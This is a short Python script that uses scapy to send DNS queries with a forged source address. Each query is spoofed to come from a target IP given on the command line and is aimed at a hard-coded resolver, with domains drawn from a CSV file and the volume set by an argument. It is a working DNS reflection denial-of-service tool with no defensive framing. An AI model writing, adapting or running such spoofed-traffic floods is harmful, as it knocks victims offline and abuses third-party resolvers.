from scapy.all import *
import sys
import csv
import random
import time

domains_list=[]

with open('domains.csv', newline='') as csvfile:
     spamreader = csv.reader(csvfile, delimiter=',', quotechar='|')
     for row in spamreader:
         domains_list.append(row[1])

dns_list=[]

# with open('nameservers.csv', newline='') as csvfile:
#      spamreader = csv.reader(csvfile, delimiter=',', quotechar='|')
#      for row in spamreader:
#          dns_list.append(row[0])

target = sys.argv[1]
scale = int(sys.argv[2])

for i in range(scale):
    rand_time = random.random()
    time.sleep(rand_time/100)

    try:
        packet = IP(src=target, dst="140.233.103.136")/UDP(sport=RandShort(), dport=53)/DNS(id=RandShort(), rd=1,qd=DNSQR(qname=random.choice(domains_list),qtype="A"))
        send(packet)
    except Exception:
        print("Packet Failed")
        i -= 1
